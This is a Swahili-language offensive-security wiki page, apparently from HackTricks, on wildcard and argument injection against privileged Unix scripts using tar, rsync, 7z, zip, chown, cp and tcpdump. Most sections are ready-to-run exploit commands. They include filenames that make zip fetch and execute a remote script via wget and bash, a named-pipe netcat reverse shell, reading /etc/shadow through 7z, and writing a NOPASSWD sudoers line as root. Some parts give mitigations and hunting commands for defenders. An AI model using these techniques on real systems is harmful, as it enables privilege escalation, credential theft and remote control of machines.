# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> **Argument injection** ya Wildcard (pia huitwa *glob*) hutokea script yenye ruhusa za juu inapoendesha binary ya Unix kama `tar`, `chown`, `rsync`, `zip`, `7z`, … ikiwa na wildcard isiyonukuliwa kama `*`.  
> Kwa kuwa shell hupanua wildcard **kabla** ya kuendesha binary, mshambuliaji anayeweza kuunda faili kwenye working directory anaweza kutengeneza majina ya faili yanayoanza na `-`, ili yafasiriwe kama **options badala ya data**, na hivyo kuingiza flags zozote au hata commands.<sup>[[6]](#references)</sup>
> Ukurasa huu unakusanya primitives muhimu zaidi, utafiti wa hivi karibuni na mbinu za kisasa za kugundua mashambulizi za 2023-2025.

## chown / chmod

Unaweza **kunakili mmiliki/kikundi au bits za ruhusa kutoka kwa faili ya marejeleo** kwa kutumia vibaya flag ya `--reference` wakati jina la faili linalofanana na option linapopanuliwa na wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Wakati root baadaye anapotekeleza kitu kama:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

`--reference=.drf.php` iliyopanuliwa hubatilisha owner/mode iliyobainishwa wazi, na kusababisha faili zinazolingana kurithi metadata kutoka `.drf.php` (na, kwa usanidi ulio hapo juu, kuzifanya ziweze kuandikiwa na mshambuliaji).<sup>[[6]](#references)</sup>

Kagua helper yote yenye upendeleo wa juu, si mstari wake wa `chown` pekee. Mabadiliko ya ownership yanaweza kuondoa bits za set-user-ID au set-group-ID; [POSIX inaacha hali yenye upendeleo ifafanuliwe na utekelezaji](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). `chmod` inayotekelezwa baadaye katika job hiyo hiyo inaweza kurejesha bits hizo kwenye faili ilizochagua awali, na hivyo kubadilisha matokeo. Thibitisha mpangilio halisi wa amri, saraka ya glob inayoweza kuandikiwa, tabia ya faili na link zilizoathiriwa, owner na mode zitakazotokana, na kama mount inaheshimu set-user-ID kabla ya kuchukulia hili kama njia ya kupata upendeleo kupitia executable. Helper isiyosomeka huacha hatua hizo bila kujulikana.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (shambulio la pamoja).<sup>[[7]](#references)</sup>
Tazama pia karatasi ya kawaida ya DefenseCode kwa maelezo.<sup>[[6]](#references)</sup>

---

## GNU `cp` katika script yenye upendeleo wa juu

Kagua script inayoendeshwa kama root ambayo hunakili kutoka kwenye working directory iliyochaguliwa na mtumiaji anayeiita, kwa kutumia glob tupu, kama vile `cp .version * /etc/app/staged/`, wakati mtumiaji mwenye upendeleo wa chini anaweza kuunda majina ya faili hapo. GNU `cp` inaweza kutafsiri jina la faili linaloanza na kistari, lililopanuliwa kutoka `*`, kama chaguo. Chaguo lake la `--preserve=mode` linaweza kuhifadhi bits za mode za chanzo kwenye nakala mpya, na `--target-directory` linaweza kubadilisha mahali pa kunakili. Ili kuthibitisha athari yoyote kati ya hizi, lazima uchunguze branch halisi ya script, hali ya destination, upendeleo unaotumika, sera ya filesystem, na tabia ya GNU `cp`; maandishi ya sheria ya sudo au script pekee hayathibitishi kupandisha upendeleo. Kuweka `./` kabla ya operands au kusitisha uchanganuzi wa chaguo kwa `--` huzuia GNU `cp` kutafsiri majina yanayoanza na kistari kwa njia hii ([GNU Coreutils FAQ](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [mwongozo wa `cp`](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

Tekeleza amri holela kwa kutumia vibaya kipengele cha **checkpoint** cha GNU tar na vitendo vya checkpoint.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Mara tu root anapoendesha, kwa mfano, `tar -czf /root/backup.tgz *`, `shell.sh` hutekelezwa kama root.<sup>[[10]](#references)</sup>

### Tahadhari kuhusu kubadilisha compressor ya bsdtar / macOS

`tar` chaguomsingi kwenye matoleo ya hivi karibuni ya macOS (yanayotegemea `libarchive`) haitoi kiolesura cha GNU tar cha `--checkpoint`, lakini bsdtar inaandika kuhusu **--use-compress-program** kwa ajili ya kuchagua compressor ya nje.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wakati script yenye mamlaka inaendesha `tar -cf backup.tar *`, hii huchagua `sh` kupitia `PATH` ya mwathiriwa, na bsdtar huianzisha kama compressor.<sup>[[11]](#references)</sup> Hii inathibitisha option injection, lakini yenyewe si njia ya kuaminika ya kutekeleza amri yoyote: jina la faili linaloundwa na wildcard haliwezi kuwa na `/`, na bsdtar hutoa data ya archive badala ya amri ya shell iliyochaguliwa na mshambulizi. Utekelezaji wa code pia unahitaji executable inayodhibitika na inayopatikana kupitia `PATH`, au njia nyingine ya argument inayoweza kutaja programu yenye manufaa.

---

## rsync

`rsync` hukuruhusu kubadilisha remote shell au remote binary kupitia flags za command-line kama `-e` na `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

Ikiwa root baadaye ata-archive directory kwa `rsync -az * backup:/srv/`, flag iliyoingizwa inaweza kuendesha shell kupitia utaratibu wa remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Hata kama script yenye privileged *kwa kujilinda* inaweka `--` kabla ya wildcard (ili kuzuia uchanganuzi wa options), CLI ya 7-Zip inakubali **file list files** kwa kuweka `@` kabla ya filename. Ukiunganisha hilo na symlink, unaweza *kutoa arbitrary files nje*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

Ikiwa root itatekeleza kitu kama:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip itajaribu kusoma `root.txt` (→ `/etc/shadow`) kama orodha ya faili na kusitisha kazi, **ikichapisha yaliyomo kwenye stderr**.<sup>[[13]](#references)</sup>

Hii bado hufanya kazi licha ya `-- *` kwa sababu CLI ya 7-Zip hukubali waziwazi majina ya faili ya kawaida na `@listfiles` kama ingizo za nafasi, kwa hivyo jina halisi la faili kama `@root.txt` bado hushughulikiwa kwa namna maalum.<sup>[[13]](#references)</sup>

---

## zip

Kuna mbinu mbili za vitendo sana pale programu inapopitisha majina ya faili yanayodhibitiwa na mtumiaji kwa `zip` (iwe kupitia wildcard au kwa kuorodhesha majina bila `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE kupitia test hook: `-T` huwasha “test archive” na `-TT <cmd>` hubadilisha programu ya majaribio na programu yoyote (toleo refu: `--unzip-command <cmd>`). Ikiwa unaweza kuingiza majina ya faili yanayoanza na `-`, gawa flags katika majina tofauti ya faili ili uchanganuzi wa short-options ufanye kazi.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Maelezo
- USijaribu kutumia jina moja la faili kama `'-T -TT <cmd>'` — short options huchanganuliwa herufi moja moja na hilo litashindikana. Tumia tokens tofauti kama ilivyoonyeshwa.<sup>[[3]](#references)</sup>
- Ikiwa app huondoa slashes kwenye majina ya faili, pakua kutoka kwa host/IP tupu (njia chaguomsingi `/index.html`) na uhifadhi kwenye kifaa chako kwa `-O`, kisha utekeleze.<sup>[[3]](#references)</sup>
- Unaweza kutatua matatizo ya uchanganuzi kwa kutumia `-sc` (onyesha argv iliyochakatwa) au `-h2` (maelezo zaidi) ili kuelewa jinsi tokens zako zinavyotumika.<sup>[[3]](#references)</sup>

Mfano (tabia ya ndani kwenye zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Ikiwa web layer inaonyesha stdout/stderr ya `zip` (jambo la kawaida kwenye wrappers rahisi), flags zilizoingizwa kama `--help` au hitilafu zinazotokana na options zisizo sahihi zitaonekana kwenye HTTP response, na kuthibitisha command-line injection huku zikisaidia kuboresha payload.<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

Wrapper yenye privileges inapopanua directory inayoweza kuandikwa kwa kutumia wildcard, inafaa kuangalia hooks hizi za options zilizoandikwa.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag ya kutumia vibaya | Athari |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Peleka command string kwa shell |
| `git`   | `-c core.sshCommand=<cmd>` | Tumia `<cmd>` badala ya SSH kwa Git fetch/push |
| `scp`   | `-S <program>` | Tumia program mbadala ya muunganisho inayooana na SSH |

Primitives hizi ni ukaguzi muhimu zaidi ya mbinu za kawaida za *tar/rsync/zip*.

---

## Hunting vulnerable wrappers and jobs

Case studies za hivi karibuni na mwongozo wa detection vinaonyesha kuwa wildcard/argv injection si tatizo la **cron + tar** pekee tena.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Aina hii ya bug inaendelea kujitokeza katika:

- vipengele vya web vinavyopakua "kila kitu kama zip/tar" kutoka kwenye directories za upload zinazodhibitiwa na mshambuliaji
- debug shells za vendor/appliance zinazotoa wrapper ya **tcpdump** yenye sehemu za filename/filter zinazodhibitiwa na mshambuliaji
- backup au rotation jobs zinazoendesha `tar`, `rsync`, `7z`, `zip`, `chown`, au `chmod` kwenye directories zinazoweza kuandikwa

Amri muhimu za triage (uendeshaji wa `pspy` hutumia flags zake zilizoandikwa za process/file-event na interval).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Quick heuristics:

- `-- *` ni suluhisho zuri kwa GNU tools nyingi, lakini **si** kwa `7z`/`7za` kwa sababu `@listfiles` huchanganuliwa kando.<sup>[[13]](#references)</sup>
- Kwa `zip`, tafuta wrappers zinazoorodhesha moja kwa moja majina ya faili yanayodhibitiwa na mtumiaji; ugawaji wa short options (`-T` + `-TT <cmd>`) bado hufanya kazi hata bila shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Kwa `tcpdump`, zingatia hasa wrappers zinazokuruhusu kudhibiti **majina ya faili za matokeo**, **mipangilio ya mzunguko wa faili**, au hoja za **capture-file replay**.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE kupitia argv injection katika wrappers

Wakati restricted shell au wrapper ya vendor inapounda command line ya `tcpdump` kwa kuunganisha sehemu zinazodhibitiwa na mtumiaji (kwa mfano, kigezo cha "jina la faili") bila kuweka quoting/validation kali, unaweza kupenyeza flags za ziada za `tcpdump`. Mchanganyiko wa `-G` (mzunguko kulingana na muda), `-W` (kikomo cha idadi ya faili), na `-z <cmd>` (amri ya baada ya mzunguko) huwezesha kutekeleza amri yoyote kama mtumiaji anayeendesha tcpdump (mara nyingi root kwenye vifaa maalum).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Masharti ya awali:

- Unaweza kuathiri `argv` inayopitishwa kwa `tcpdump` (kwa mfano, kupitia wrapper kama `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper haisafishi nafasi au tokens zinazoanza na `-` katika sehemu ya jina la faili.<sup>[[4]](#references)</sup>

PoC ya kawaida (huendesha script ya reverse shell kutoka kwenye njia inayoweza kuandikika).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Maelezo:

- `-G 1` huzungusha faili kila sekunde, na `-W 1` husimama baada ya faili moja kuzungushwa; capture lazima ipokee packet inayolingana kabla ya kuzungusha faili.<sup>[[18]](#references)</sup>
- `-z <cmd>` huendesha amri ya baada ya kuzungusha mara moja kwa kila mzunguko na kupitisha njia ya savefile iliyofungwa kama argument; hakikisha ushughulikiaji wa argument za script/interpreter unaendana na payload yako.<sup>[[18]](#references)</sup>

Variants zisizohitaji removable media:

- Ikiwa una primitive nyingine yoyote ya kuandika faili (kwa mfano, wrapper tofauti ya amri inayoruhusu kuelekeza matokeo), weka script yako kwenye njia inayojulikana na uanzishe `-z /path/script.sh`; ikiwa inahitajika, script iendeshe `/bin/sh` yenyewe.<sup>[[18]](#references)</sup>
- Ikiwa wrapper ya vendor inakuruhusu kuchagua njia iliyozungushwa, kagua udhibiti wa njia hiyo tu pamoja na amri ya baada ya kuzungusha inayotafsiri argument yake ya savefile; udhibiti wa njia pekee hauendeshi yaliyomo kwenye faili.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump yenye wildcards/args za ziada → uandishi/usomaji holela na root

Mfano wa anti-pattern ya sudoers:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Kanuni hii inaacha chaguo kadhaa zinazopatikana kupitia parser iliyoandikwa kwenye nyaraka za tcpdump:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob na patterns zisizo na masharti makali huweka vikwazo kwa hoja ya kwanza ya `-w` pekee. `tcpdump` hukubali chaguo nyingi za `-w`; la mwisho ndilo linalotumika.<sup>[[3]](#references)[[18]](#references)</sup>
- Kanuni hii haiweki vikwazo kwa chaguo nyingine, hivyo `-Z`, `-r`, `-V`, n.k. zinaruhusiwa.<sup>[[3]](#references)[[18]](#references)</sup>

Primitives husika zimeandikwa kwenye nyaraka hapa chini.<sup>[[3]](#references)[[18]](#references)</sup>
- Badilisha njia ya lengwa kwa kutumia `-w` ya pili (ya kwanza hutimiza sudoers pekee).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal ndani ya `-w` ya kwanza ili kutoka kwenye tree yenye vizuizi.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Lazimisha umiliki wa faili za matokeo kwa kutumia `-Z root` (huunda faili zinazomilikiwa na root mahali popote).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Kuandika maudhui holela kwa kucheza tena PCAP iliyotengenezwa kwa makusudi kupitia `-r` (kwa mfano, kuongeza mstari wa sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Tengeneza PCAP yenye payload halisi ya ASCII na uiandike ukiwa root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Usomaji holela wa faili/leak ya siri kupitia `-V <file>` (hutafsiri orodha ya savefiles). Ujumbe wa hitilafu mara nyingi hurudia mistari, na hivyo kuvuja kwa maudhui.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection hadi RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Mnyororo Kamili wa Exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Huenda Shell kupitia Wildcard Injection Imegunduliwa](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Kurudi kwa Wakati Ujao: Unix Wildcards Zimekithiri (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils matumizi ya `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils matumizi ya `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [Mwongozo wa bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [Mwongozo wa rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaksia ya command line ya 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [Mwongozo wa flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Nyaraka za usanidi wa Git](https://git-scm.com/docs/git-config)
- [17] [Mwongozo wa `scp` wa OpenBSD](https://man.openbsd.org/scp)
- [18] [Mwongozo wa tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
